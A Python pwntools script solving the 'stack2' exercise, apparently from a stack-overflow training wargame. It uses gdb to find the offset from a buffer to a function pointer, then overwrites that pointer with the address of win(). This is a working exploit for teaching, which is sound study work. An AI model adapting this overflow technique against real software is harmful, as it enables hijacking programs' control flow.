#!/usr/bin/env python3

from __future__ import annotations

import re
import subprocess
from pathlib import Path

from pwn import ELF, log, p32, process

SUCCESS = b"code flow successfully changed"


def gdb_offset(binary: str) -> int:
    # Stop at main before gets(), so locals have addresses and we don't block on stdin.
    cp = subprocess.run(
        [
            "gdb",
            "-q",
            "-nx",
            "-batch",
            binary,
            "-ex",
            "break main",
            "-ex",
            "run",
            "-ex",
            "p/x &buffer",
            "-ex",
            "p/x &fp",
            "-ex",
            "quit",
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    out = cp.stdout.decode("latin-1", "replace")
    m_buf = re.search(r"\$\d+\s*=\s*(0x[0-9a-fA-F]+)", out)
    # last match is fp if we search from end
    addrs = re.findall(r"\$\d+\s*=\s*(0x[0-9a-fA-F]+)", out)
    if len(addrs) < 2:
        raise RuntimeError("gdb offset parse failed:\n" + out)
    buf = int(addrs[-2], 16)
    fp = int(addrs[-1], 16)
    off = fp - buf
    if off <= 0 or off > 512:
        raise RuntimeError("suspicious offset {} (buf={}, fp={})".format(off, hex(buf), hex(fp)))
    return off


def main() -> int:
    prog = str(Path(__file__).resolve().with_name("stack2"))
    elf = ELF(prog)
    win = elf.symbols.get("win")
    if not win:
        log.failure("win() not found")
        return 2

    off = gdb_offset(prog)
    payload = b"A" * off + p32(win) + b"\n"

    io = process([prog])
    io.send(payload)
    out = io.recvall(timeout=2)
    if SUCCESS in out:
        log.success("stack2 solved (off=%d)", off)
        return 0
    log.failure("stack2 failed")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
